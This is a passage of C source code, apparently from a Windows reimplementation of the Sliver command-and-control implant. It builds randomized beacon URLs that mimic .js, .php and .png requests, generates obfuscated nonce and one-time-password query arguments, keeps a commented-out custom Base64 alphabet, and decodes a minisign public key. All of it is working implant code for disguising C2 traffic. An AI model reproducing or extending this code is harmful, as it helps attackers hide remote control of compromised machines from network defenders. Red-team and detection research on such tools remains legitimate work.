	if (pClient->lpPathPrefix != NULL && StrCmpA(pClient->lpPathPrefix, "/")) {
		cbPathPrefix = lstrlenA(pClient->lpPathPrefix);
		if (cbPathPrefix >= cbResult) {
			cbResult = cbPathPrefix * 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcpyA(lpResult, pClient->lpPathPrefix);
		dwPos += cbPathPrefix;
		lstrcatA(lpResult, "/");
		dwPos++;
	}

	for (i = 0; i < cSegment; i++) {
		if (dwPos + lstrlenA(pSegments[i]) + 1 >= cbResult) {
			cbResult = (dwPos + lstrlenA(pSegments[i]) + 1) * 2;
			lpResult = REALLOC(lpResult, cbResult + 1);
		}

		lstrcatA(lpResult, pSegments[i]);
		dwPos += lstrlenA(pSegments[i]);
		if (i < cSegment - 1) {
			lstrcatA(lpResult, "/");
			dwPos++;
		}
	}

	return lpResult;
}

LPSTR* RandomUrlPath
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ LPSTR* pSegments,
	_In_ DWORD cSegments,
	_In_ LPSTR* pFileNames,
	_In_ DWORD cFileNames,
	_In_ LPSTR lpExtension,
	_Out_ PDWORD pcCountOfResult
)
{
	DWORD dwCountOfSegments = 0;
	DWORD i = 0;
	LPSTR* pResult = NULL;
	DWORD cResult = 0;
	LPSTR lpFileName = NULL;
	DWORD cbFileName = 0;
	PHTTP_PROFILE pProfile = pClient->pProfile;

	pResult = ALLOC((pProfile->dwMaxNumberOfSegments + 1) * sizeof(LPSTR));
	if (cSegments > 0) {
		dwCountOfSegments = GenRandomNumber32(pProfile->dwMinNumberOfSegments, pProfile->dwMaxNumberOfSegments);
		for (i = 0; i < dwCountOfSegments; i++) {
			pResult[cResult++] = DuplicateStrA(pSegments[GenRandomNumber32(0, cSegments)], 0);
		}
	}

	pResult = REALLOC(pResult, (cResult + 1) * sizeof(LPSTR));
	lpFileName = DuplicateStrA(pFileNames[GenRandomNumber32(0, cFileNames)], lstrlenA(lpExtension) + 1);
	lstrcatA(lpFileName, ".");
	lstrcatA(lpFileName, lpExtension);
	pResult[cResult++] = lpFileName;
	if (pcCountOfResult != NULL) {
		*pcCountOfResult = cResult;
	}

	return pResult;
}

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
)
{
	DWORD dwNumOfSegments = 0;
	LPSTR* pSegments = NULL;
	DWORD i = 0;
	LPSTR lpResult = NULL;
	PHTTP_PROFILE pProfile = pClient->pProfile;

	if (SegmentType == PollType) {
		pSegments = RandomUrlPath(pClient, pProfile->PollPaths, pProfile->cPollPaths, pProfile->PollFiles, pProfile->cPollFiles, "js", &dwNumOfSegments);
	}
	else if (SegmentType == SessionType) {
		pSegments = RandomUrlPath(pClient, pProfile->SessionPaths, pProfile->cSessionPaths, pProfile->SessionFiles, pProfile->cSessionFiles, "php", &dwNumOfSegments);
	}
	else if (SegmentType == CloseType) {
		pSegments = RandomUrlPath(pClient, pProfile->ClosePaths, pProfile->cClosePaths, pProfile->CloseFiles, pProfile->cCloseFiles, "png", &dwNumOfSegments);
	}
	else {
		goto CLEANUP;
	}

	lpResult = JoinUrlPath(pClient, pSegments, dwNumOfSegments);
CLEANUP:
	if (pSegments != NULL) {
		for (i = 0; i < dwNumOfSegments; i++) {
			FREE(pSegments[i]);
		}

		FREE(pSegments);
	}

	return lpResult;
}

LPSTR NonceQueryArgument
(
	_In_ UINT64 uNonceID
)
{
	CHAR szNonceQueryArgChars[] = "abcdefghijklmnopqrstuvwxyz_";
	DWORD i = 0;
	LPSTR lpResult = NULL;
	DWORD dwRandIdx = 0;
	LPSTR lpTemp = NULL;
	UINT64 uNonce = 0;
	CHAR Key;

	uNonce = (((UINT64)GenRandomNumber32(0, 9999)) * 101) + uNonceID;
	lpResult = ALLOC(100);
	Key = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
	wsprintfA(lpResult, "%c=%lu", Key, (DWORD)uNonce);
	for (i = 0; i < 3; i++) {
		lpTemp = lpResult;
		dwRandIdx = GenRandomNumber32(2, lstrlenA(lpTemp));
		lpResult = StrInsertCharA(lpResult, szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))], dwRandIdx);
		FREE(lpTemp);
	}

	return lpResult;
}

LPSTR OtpQueryArgument
(
	_In_ UINT64 uOtpCode
)
{
	CHAR szNonceQueryArgChars[] = "abcdefghijklmnopqrstuvwxyz_";
	DWORD i = 0;
	LPSTR lpResult = NULL;
	DWORD dwRandIdx = 0;
	LPSTR lpTemp = NULL;
	CHAR Key1;
	CHAR Key2;
	CHAR szOtpCode[9];

	SecureZeroMemory(szOtpCode, sizeof(szOtpCode));
	lpResult = ALLOC(100);
	Key1 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
	Key2 = szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))];
	wsprintfA(lpResult, "%c%c=%08lu", Key1, Key2, (DWORD)uOtpCode);
	for (i = 0; i < 3; i++) {
		lpTemp = lpResult;
		dwRandIdx = GenRandomNumber32(3, lstrlenA(lpTemp));
		lpResult = StrInsertCharA(lpResult, szNonceQueryArgChars[GenRandomNumber32(0, lstrlenA(szNonceQueryArgChars))], dwRandIdx);
		FREE(lpTemp);
	}

	return lpResult;
}

LPSTR CreatePollURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, PollType);
	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?");
	lpNonce = NonceQueryArgument(pConfig->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	FREE(lpNonce);
	FREE(lpUrlPath);

	return lpResult;
}

LPSTR CreateSessionURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonce = NULL;

	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?");
	lpNonce = NonceQueryArgument(pConfig->uEncoderNonce);
	lstrcatA(lpResult, lpNonce);
CLEANUP:
	FREE(lpNonce);
	FREE(lpUrlPath);

	return lpResult;
}

LPSTR StartSessionURL
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pClient
)
{
	LPSTR lpUrlPath = NULL;
	LPSTR lpTemp = NULL;
	LPSTR lpResult = NULL;
	LPSTR lpNonceQuery = NULL;
	LPSTR lpOtpQuery = NULL;
	UINT64 uOtpCode = 0;

	lpUrlPath = ParseSegmentsUrl(pClient, SessionType);
	lpTemp = TrimSuffixA(lpUrlPath, "php", FALSE);
	FREE(lpUrlPath);
	lpUrlPath = lpTemp;
	lpUrlPath = REALLOC(lpUrlPath, lstrlenA(lpUrlPath) + 5);
	lstrcatA(lpUrlPath, "html");
	lpResult = DuplicateStrA(pClient->pProfile->lpUrl, lstrlenA(lpUrlPath) + 100);
	lstrcatA(lpResult, "/");
	lstrcatA(lpResult, lpUrlPath);
	lstrcatA(lpResult, "?");
	lpNonceQuery = NonceQueryArgument(pConfig->uEncoderNonce);
	lstrcatA(lpResult, lpNonceQuery);
	uOtpCode = GetOtpNow(&pClient->OtpData);
	lpOtpQuery = OtpQueryArgument(uOtpCode);
	lstrcatA(lpResult, "&");
	lstrcatA(lpResult, lpOtpQuery);
CLEANUP:
	FREE(lpNonceQuery);
	FREE(lpOtpQuery);
	FREE(lpUrlPath);

	return lpResult;
}

//LPSTR SliverBase64Encode
//(
//	_In_ PBYTE lpInput,
//	_In_ DWORD cbInput
//)
//{
//	LPSTR lpResult = NULL;
//	DWORD cbResult = 0;
//	CHAR szOldCharSet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
//	CHAR szNewCharSet[] = "a0b2c5def6hijklmnopqr_st-uvwxyzA1B3C4DEFGHIJKLM7NO9PQR8ST+UVWXYZ";
//	DWORD i = 0;
//	DWORD dwPos = 0;
//
//	lpResult = Base64Encode(lpInput, cbInput, TRUE);
//	cbResult = lstrlenA(lpResult);
//	for (i = 0; i < cbResult; i++) {
//		dwPos = StrChrA(szOldCharSet, lpResult[i]) - szOldCharSet;
//		lpResult[i] = szNewCharSet[dwPos];
//	}
//
//	return lpResult;
//}

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
)
{
	PMINISIGN_PUB_KEY pResult = NULL;
	LPSTR* pSplittedArray = NULL;
	DWORD cbSplittedArray = 0;
	PBUFFER pTemp = NULL;
	DWORD i = 0;

	pSplittedArray = StrSplitNA(lpInput, "\n", 0, &cbSplittedArray);
	if (pSplittedArray == NULL || cbSplittedArray == 0) {
		goto CLEANUP;
	}

	pTemp = Base64Decode(pSplittedArray[1]);
	if (pTemp->cbBuffer != sizeof(MINISIGN_PUB_KEY)) {
		goto CLEANUP;
	}

	pResult = (PMINISIGN_PUB_KEY)pTemp->pBuffer;
	pTemp->pBuffer = NULL;
CLEANUP:
	FreeBuffer(pTemp);
	if (pSplittedArray != NULL) {
		for (i = 0; i < cbSplittedArray; i++) {
			if (pSplittedArray[i] != NULL) {
				FREE(pSplittedArray[i]);
			}
		}

		FREE(pSplittedArray);
	}

	return pResult;
}